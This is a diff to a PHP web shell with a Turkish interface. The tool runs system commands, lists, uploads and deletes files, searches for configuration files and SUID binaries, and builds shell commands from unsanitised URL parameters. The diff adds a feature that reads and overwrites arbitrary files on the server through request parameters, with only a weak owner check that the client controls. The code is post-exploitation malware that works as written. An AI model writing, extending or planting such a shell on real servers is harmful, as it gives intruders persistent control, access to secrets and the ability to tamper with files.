@@ -4,7 +4,9 @@ $host = getHost() . ":" . getPort();
 $system = execCommand("uname -a");
 $userid = execCommand("id");
 $pwd = pwd();
+$user = trim(execCommand("whoami"));
 $activeForm = getURLVar('activeForm');
+
 function getURLVar($var) {
     return isset($_GET[$var]) ? $_GET[$var] : null;
 }
@@ -50,6 +52,18 @@ if (getURLVar("action") == "manageFile") {
     }
 }
 
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['updatedFileName'])) {
+    $filePath = $_GET['updatedFileName'];
+    $fileOwner = trim($_GET['updatedFileOwner']);
+    $activeForm = 'formUpdateFile';
+    if ($fileOwner === $user ) {
+        $fileContent = file_get_contents($filePath);
+    }
+    else {
+        $fileContent = "Dosya Açılamadı";
+    }
+}
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['deletedFileName'])) {
     $filePath = $_POST['deletedFileName'];
     $filePerm = $_POST['deletedFilePerm'];
@@ -61,11 +75,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['deletedFileName'])) {
     shell_exec($deleteCommand);
 }
 
-if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["action"]) && $_POST["action"] == "submit") {
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["action"]) && $_POST["action"] == "submitFile") {
     $directory = getURLVar("directory") ? getURLVar("directory") : ".";
-    if (isset($_FILES["file"]) && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
+    if (isset($_FILES["file"])) {
         move_uploaded_file($_FILES["file"]["tmp_name"], $directory . '/' . basename($_FILES["file"]["name"]));
     }
+}
+
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["action"]) && $_POST["action"] == "updateFile") {
+    $updatedContent = $_POST['updatedFileContent'];
+    $updatedFile = $_POST['updatedFileName'];
+    file_put_contents($updatedFile, $updatedContent);
+    $fileContent = file_get_contents($updatedFile);
 }
 
 if (getURLVar("action") == "findConf") {
@@ -78,6 +99,7 @@ if (getURLVar("action") == "findFile") {
     $file = getURLVar("file") ? getURLVar("file") : "*";
     $findFileCommandOutput = execCommand("find " . $directory . " -name ".$file);
 }
+
 if (getURLVar("action") == "commonCommands") {
     $command = getURLVar("command");
     if ($command === "SUID"){
@@ -232,7 +254,7 @@ if (getURLVar("action") == "commonCommands") {
             <button id="showFiles">Dosyaları Göster</button>
         </form>
         <form id="formUploadFile" style="display:none;" method="POST" enctype="multipart/form-data">
-            <input hidden value="submit" name="action">
+            <input hidden value="submitFile" name="action">
             <input type="file" name="file">
             <input type="submit" value="Dosya Yükle">
         </form>
@@ -258,12 +280,26 @@ if (getURLVar("action") == "commonCommands") {
                                 <input type="hidden" name="deletedFilePerm" value="<?php echo $fileDetails['permissions']; ?>">
                                 <button id="deleteFile">Dosyayı Sil</button>
                             </form>
+                            <form id="formUpdateFile" method="GET">
+                                <input hidden value="updateFile" name="action">
+                                <input hidden value="formUpdateFile" name="activeForm">
+                                <input type="hidden" name="updatedFileName" value="<?php echo $directory?>/<?php echo $fileDetails['name']; ?>">
+                                <input type="hidden" name="updatedFileOwner" value="<?php echo $fileDetails['owner']; ?>">
+                                <button id="updateFile">Dosyayı Düzenle</button>
+                            </form>
                         </li>
                         <hr>
                     <?php endforeach; ?>
                 <?php endif; ?>
             </ul>
         </div>
+        <form id="formUpdateFile" style="display:none;" method="POST">
+            <input hidden value="updateFile" name="action">
+            <input type="hidden" name="updatedFileName" value="<?php echo $filePath ?>">
+            <button type="submit">Değişiklikleri Kaydet</button>
+            <textarea id="updateFileOutput" name="updatedFileContent"><?php echo $fileContent ?></textarea>
+            
+        </form>
 
         <form id="formFindConf" style="display:none;" method="GET">
             <input hidden value="findConf" name="action">
@@ -314,6 +350,9 @@ if (getURLVar("action") == "commonCommands") {
                 Kullanıcı yetkisinin olduğu bütün dizinlere dosya yüklemesi yapabilir.
                 (yüklenen dosyanın listede gözükmesi için sayfanın yenilenmesi gerekir.)
 
+                Dosya Düzenleme:
+                Kullanıcı yetki sahibi olduğu dosyaların içeriğini değiştirebilir.
+
                 Konfigurasyon Dosyası Bul:
                 Girilen dizin üzerindeki bütün .conf .cnf ve .cfg uzantılı dosyaları sıralar.
 
@@ -330,7 +369,7 @@ if (getURLVar("action") == "commonCommands") {
 
         <script>
         function showForm(...formIds) {
-            const allForms = ['formExec', 'formFileManage', 'formUploadFile', 'fileList', 'formFindConf', 'formfindFile', 'formCommonCommands', 'formHelp'];
+            const allForms = ['formExec', 'formFileManage', 'formUploadFile', 'fileList', 'formFindConf', 'formfindFile', 'formCommonCommands', 'formHelp', 'formUpdateFile'];
             allForms.forEach(function(formId) {
                 document.getElementById(formId).style.display = 'none';
             });
@@ -350,6 +389,7 @@ if (getURLVar("action") == "commonCommands") {
                 else if (activeForm === 'formfindFile') showForm('formfindFile');
                 else if (activeForm === 'formCommonCommands') showForm('formCommonCommands');
                 else if (activeForm === 'formHelp') showForm('formHelp');
+                else if (activeForm === 'formUpdateFile') showForm('formUpdateFile');
             }
         }
         </script>
